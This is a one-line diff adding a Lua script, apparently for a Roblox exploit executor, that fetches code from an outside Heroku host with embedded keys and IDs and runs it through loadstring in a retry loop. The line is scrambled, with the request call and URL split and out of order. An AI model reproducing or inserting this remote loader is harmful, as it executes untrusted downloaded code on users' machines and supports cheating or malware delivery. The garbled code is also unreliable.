@@ -1,0 +1,1 @@
+pcall(function() gets=function() return syn.r317904&d2=FrostHub"}).Body end;rt=0;repeat spawn(function() pcall(function() loadstring(gets())() end) end);rt=rt+1;wait(60) until getgenv().executed or rt >= 10 end)equest({Method="GET",Url="https://stayfrosty.herokuapp.com/getscript?d=u3G2ZejJHJzSe2wW10RH&k=VINNYONTOP123&id=747565338698
